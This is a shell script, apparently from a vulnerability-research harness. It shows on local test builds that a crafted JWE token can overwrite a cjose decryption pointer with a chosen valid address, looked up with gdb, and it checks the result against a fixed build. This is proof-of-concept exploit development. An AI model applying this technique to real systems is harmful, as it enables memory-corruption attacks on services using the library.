#!/bin/sh
# W202: wire-carried *valid* pointer into the W199 jansson value field.
#
# The W199 token writes a chosen 8-byte value at cek+64, which the real
# decrypt path dereferences as the `enc` string at jwe.c:1098. This runner
# points it at the fixed NUL-terminated "A128CBC-HS256" literal in the
# -no-pie w1-trace-vuln build, so strcmp succeeds instead of faulting. Every
# server is one ephemeral 127.0.0.1 listener opened by one w1 process per
# case; no listener remains. Determinism is limited by jansson's random
# hashtable seed (W183): retries find a run where the adjacent object is enc.
# Expected terminal line: W202_VALIDPTR_OK
set -eu

HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE"
OUT="$HERE/evidence/w202-validptr"
mkdir -p "$OUT"

if [ ! -x ./w1-trace-vuln ] || [ ! -x ./w1-plain-fixed ]; then
    sh build.sh
fi
readelf -h ./w1-trace-vuln | grep -q 'EXEC' || {
    echo 'w1-trace-vuln is not -no-pie' >&2; exit 1;
}

ADDR=$(gdb -q -batch -ex 'p CJOSE_HDR_ENC_A128CBC_HS256' ./w1-trace-vuln \
       | sed -n 's/.*= \(0x[0-9a-f]*\) .*/\1/p')
[ -n "$ADDR" ]
PTRHEX=$(python3 -c 'import struct,sys; print(struct.pack("<Q", int(sys.argv[1], 16)).hex())' "$ADDR")
printf 'LITERAL_ADDR=%s PTR_HEX=%s\n' "$ADDR" "$PTRHEX" | tee "$OUT/address.txt"

# drive BIN LOG CLIENT PTR [gdb|plain]
# CLIENT=ptr-client.py sends PTR at plaintext offset 64; other clients send
# their own safe token. A gdb run breaks in _cjose_jwe_calc_auth_tag and
# prints the dereferenced `enc` pointer and its contents before continuing.
drive() {
    bin=$1; log=$2; client=$3; ptr=$4; mode=$5
    : > "$log"
    if [ "$mode" = gdb ]; then
        timeout 25 gdb -q -batch -ex 'set pagination off' \
            -ex 'break _cjose_jwe_calc_auth_tag' -ex run \
            -ex 'p enc' -ex 'x/s enc' -ex 'bt 4' -ex continue -ex 'bt 4' \
            --args "./$bin" > "$log" 2>&1 &
    else
        "./$bin" > "$log" 2>&1 &
    fi
    pid=$!
    port=''; poll=0
    while [ "$poll" -lt 200 ]; do
        port=$(grep -m1 '^PORT=' "$log" 2>/dev/null | cut -d= -f2 || true)
        [ -n "$port" ] && break
        sleep 0.05
        poll=$((poll + 1))
    done
    if [ -z "$port" ]; then
        kill "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
        return 1
    fi
    if [ "$client" = ptr-client.py ]; then
        python3 "$client" 127.0.0.1 "$port" "$ptr" >> "$log" 2>&1 || true
    else
        python3 "$client" 127.0.0.1 "$port" valid >> "$log" 2>&1 || true
    fi
    wait "$pid" 2>/dev/null || true
    return 0
}

# Control: fixed build rejects the same wire token before the write.
drive w1-plain-fixed "$OUT/fixed-validptr.log" ptr-client.py "$PTRHEX" plain
grep -qF 'DECRYPT=0 ERRCODE=1' "$OUT/fixed-validptr.log"
grep -qF 'CEK_LEN_AFTER=32' "$OUT/fixed-validptr.log"

# Baseline: the original W199 non-address faults in strcmp when the
# adjacent jansson string happens to be enc (W183 seed). Retry boundedly.
saw_bad=0
attempt=1
while [ "$attempt" -le 24 ]; do
    log="$OUT/baseline-$attempt.log"
    if drive w1-trace-vuln "$log" ptr-client.py 4141414141414141 gdb; then
        if grep -qF 'enc=0x4141414141414141' "$log" && \
           grep -qF 'SIGSEGV' "$log"; then
            saw_bad=1
            cp "$log" "$OUT/baseline-nonaddress.log"
            break
        fi
    fi
    attempt=$((attempt + 1))
done
[ "$saw_bad" -eq 1 ]

# Decisive limb: the wire-carried value is the valid literal address.
saw=0
attempt=1
while [ "$attempt" -le 24 ]; do
    log="$OUT/validptr-$attempt.log"
    if drive w1-trace-vuln "$log" ptr-client.py "$PTRHEX" gdb; then
        if grep -qF "$ADDR" "$log" && \
           grep -qF 'A128CBC-HS256' "$log" && \
           grep -qF 'CEK_LEN_AFTER=72' "$log" && \
           ! grep -qF 'SIGSEGV' "$log"; then
            saw=1
            cp "$log" "$OUT/valid-pointer.log"
            break
        fi
    fi
    attempt=$((attempt + 1))
done
[ "$saw" -eq 1 ]

echo W202_VALIDPTR_OK
